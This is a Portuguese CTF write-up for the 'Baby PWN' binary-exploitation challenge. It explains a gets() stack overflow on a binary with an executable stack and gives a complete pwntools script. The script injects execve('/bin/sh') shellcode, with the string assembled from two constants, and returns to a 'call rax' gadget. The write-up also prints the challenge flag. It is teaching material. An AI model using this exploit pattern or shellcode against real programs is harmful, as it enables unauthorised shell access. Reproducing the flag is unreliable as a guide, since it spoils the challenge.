# WriteUp: Baby PWN
## Descrição do Desafio
**Categoria:** PWN \
**Descrição:**
> I hope you are having a nice day.

### Arquivos
| Arquivo | Descrição |
| ------- | --------- |
| main | Executável. |
| solve.py | Script da solução. |

> 📥 **Download:** [Arquivos](https://github.com/HawkSecUnifei/Writeups/raw/refs/heads/main/2025/BITS_CTF/Baby-PWN/Arquivos.zip)

## Passo a Passo da Solução
### 1. Análise do executável
Olhando para o código do executável pelo **Ghidra**, notamos que ele é bem simples. Ele apenas chama uma função `vuln()` que por sua vez, chama a `gets()`. 

Aqui já sabemos que o executável é vulnarável a *buffer overflow*, já que a `gets()` não limita e entrada de caracteres. Porém, a vulnerabilidade principal está na falta da proteção `NX`.

```bash
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

A proteção `NX` é a responsável por fazer com que os dados na pilha não possam ser executados, porém sem ela, podemos inserir *shellcodes* no *buffer* e por fim retornar para eles, fazendo eles serem executados. 

### 2. Exploit
Já sabemos que devemos escrever *shellcodes*, porém não sabemos como retornar para eles, pois a área da pilha é influenciada pelo `ASLR` e não pelo `PIE`, e como ele dificilmente estará desativado, a pilha estará com os endereços randomizados.

É aí, que surge a instrução `call rax`, identificada pelo comando `ROPgadget --binary=main`. Essa instrução é importante porque sabemos o endereço, que não é aleatório, e principalmente, porque o `rax` armazena um ponteiro para o *buffer* após a função `gets()` ser executada. Com isso a solução está praticamente pronta, falta descobrir quantos *bytes* escrever até o endereço de retorno.

```bash
pwndbg> retaddr
0x7fffffffded8 —▸ 0x401168 (main+18) ◂— mov eax, 0

pwndbg> x/100x $rsp
0x7fffffffde60: 0x41414141      0x41414141      0x00080000      0x00000000
0x7fffffffde70: 0x00008000      0x00000000      0xffffdea8      0x00007fff
0x7fffffffde80: 0x00000019      0x00000021      0x00000000      0x00000000
0x7fffffffde90: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdea0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdeb0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdec0: 0x00000000      0x00000000      0xf7fe5af0      0x00007fff
0x7fffffffded0: 0xffffdee0      0x00007fff      0x00401168      0x00000000
```

Endereço de retorno está armazenado no endereço `0x7fffffffded8` e o *buffer* começa no endereço `0x7fffffffde60`, logo a quantidade de *bytes* para chegar no retorno é 120.

{% code title="solve.py" overflow="wrap" lineNumbers="true" %}

```py
from pwn import *

elf = context.binary = ELF("./main")
context.arch = "x86-64"

p = remote("chals.bitskrieg.in", 6001)
#p = process()

shellcode = asm('''
                mov eax, 0x3c
                dec al
                mov rdx, 0
                mov rsi, 0
                mov rdi, 0x0065722f6d65602f
                mov r10, 0x0003010001040200
                add rdi, r10
                push rdi
                mov rdi, rsp
                syscall
''')

payload = shellcode + b"A" * (120 - len(shellcode)) + p64(0x0000000000401014)
p.sendline(payload)
p.interactive()
```

{% endcode %}

{% hint style="warning" %}

**Importante:** O *shellcode* foi reutilizado do desafio [Execute](/HackTheBox/Execute/README.md), por isso ele não está otimizado.

{% endhint %}

### Flag
`BITSCTF{w3lc0m3_70_7h3_w0rld_0f_b1n4ry_3xpl01t4t10n_ec5d9205}` 

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)